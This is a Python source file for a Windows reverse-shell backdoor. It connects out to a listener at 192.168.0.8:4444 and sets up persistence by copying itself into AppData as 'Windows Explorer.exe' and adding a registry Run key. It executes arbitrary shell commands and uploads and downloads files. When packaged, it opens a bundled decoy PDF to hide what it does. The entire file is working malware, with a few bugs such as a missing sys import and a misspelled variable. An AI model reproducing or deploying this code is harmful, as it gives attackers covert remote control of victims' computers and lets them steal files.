import socket
import subprocess, json, os, base64, shutil

class Backdoor:
    def __init__(self, ip, port):
        self.persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))


    def persistent(self):
        loc = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(loc):
            shutil.copyfile(sys.executable, loc)
            subprocess.call('reg add HKCU\Software\Microsft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + loc + '"', shell=True)


    def reliable_send(self, data):
        json_data = (json.dumps(data))
        #print(" Reliable_send " + json_data)
        self.connection.send(json_data.encode('utf-8'))
        #self.connection.send((json_data))

    def reliable_receive(self):
        ##json_data="".encode('utf-8')
        json_data=base64.b64decode("")
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                #print(" Reliable_receive ")
                #print(json.loads(json_data))
                return json.loads(json_data)
            except ValueError:
                continue
        
    def execute_system_command(self, command):
        return (subprocess.check_output(command, shell=True)).decode('utf-8')
        #print ((subprocess.check_output(command, shell=True)).decode('utf-8'))

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
            #return file.read()

    def write_file(self, path, content):
        with open(path, "wb")as file:
            file.write(base64.b64decode(content))
            #file.write((content).encode('utf-8'))
            #file.write(content)
            return "[+] upload successful"    
         
    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = (self.change_working_directory_to(command[1]))
                elif command[0] == "download":
                    command_result = (self.read_file(command[1])).decode('utf-8')
                    #command_result = base64.b64decode(self.read_file(command[1]))
                elif command[0] == "upload":
                    command_result = (self.write_file(command[1],command[2]))
                else:
                    command_result = (self.execute_system_command(command))

            except Exception as e:
                command_result = "[-] Error during executing command" + str(e)

            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(fie_name, shell=True)

try:
    mb = Backdoor("192.168.0.8",4444)
    mb.run()
except Exception:
    sys.exit()
